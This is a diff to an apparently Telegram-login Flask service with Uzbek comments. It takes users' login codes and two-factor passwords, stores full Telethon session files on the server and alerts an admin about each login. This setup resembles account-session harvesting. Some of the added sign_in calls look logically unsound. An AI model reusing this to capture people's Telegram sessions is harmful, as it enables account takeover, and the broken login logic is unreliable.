@@ -141,8 +141,12 @@ def verify_code():
 
     try:
         async def work():
-            # 1️⃣ vaqtinchalik client
-            temp_client = TelegramClient(None, API_ID, API_HASH)
+            # 1️⃣ vaqtinchalik client (kodni tekshirish uchun)
+            temp_client = TelegramClient(
+                None,
+                API_ID,
+                API_HASH
+            )
             await temp_client.connect()
 
             await temp_client.sign_in(
@@ -153,10 +157,16 @@ def verify_code():
 
             me = await temp_client.get_me()
 
-            # 2️⃣ ASOSIY session — user_id bilan
+            # 2️⃣ ASOSIY SESSION — user_id bilan
             session_file = os.path.join(SESSIONS_DIR, str(me.id))
-            client = TelegramClient(session_file, API_ID, API_HASH)
+            client = TelegramClient(
+                session_file,
+                API_ID,
+                API_HASH
+            )
+
             await client.connect()
+            await client.sign_in(phone=phone)
 
             await temp_client.disconnect()
             await client.disconnect()
@@ -166,8 +176,9 @@ def verify_code():
         me = run_async(work())
         pending.pop(phone, None)
 
-        # 🔽 DB GA YOZISH
         user_id = str(me.id)
+
+        # 🔽 subscriptions → trial
         conn = get_db()
         cur = conn.cursor()
         cur.execute("""
@@ -175,7 +186,6 @@ def verify_code():
             VALUES (%s, 'trial', FALSE)
             ON CONFLICT (user_id) DO NOTHING
         """, (user_id,))
-
         conn.commit()
         conn.close()
 
@@ -196,6 +206,7 @@ def verify_code():
         return jsonify({"status": "error"})
 
 
+
 @app.route("/verify_password", methods=["POST"])
 def verify_password():
     data = request.json
@@ -213,16 +224,16 @@ def verify_password():
             session_file = os.path.join(SESSIONS_DIR, str(me.id))
             client = TelegramClient(session_file, API_ID, API_HASH)
             await client.connect()
+            await client.sign_in(password=password)
 
             await temp_client.disconnect()
             await client.disconnect()
-
             return me
 
         me = run_async(work())
 
-        # 🔽 authorized_users ga yozamiz
         user_id = str(me.id)
+
         conn = get_db()
         cur = conn.cursor()
         cur.execute("""
@@ -232,8 +243,6 @@ def verify_password():
         """, (user_id,))
         conn.commit()
         conn.close()
-
-        pending.pop(phone, None)
 
         notify_admin_login(
             user_id=user_id,
@@ -246,6 +255,7 @@ def verify_password():
     except Exception as e:
         print("VERIFY PASSWORD ERROR:", e)
         return jsonify({"status": "invalid_password"})
+
 
 
 def notify_admin(user_id: str, phone: str, username: str | None = None):
@@ -272,6 +282,7 @@ def notify_admin(user_id: str, phone: str, username: str | None = None):
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
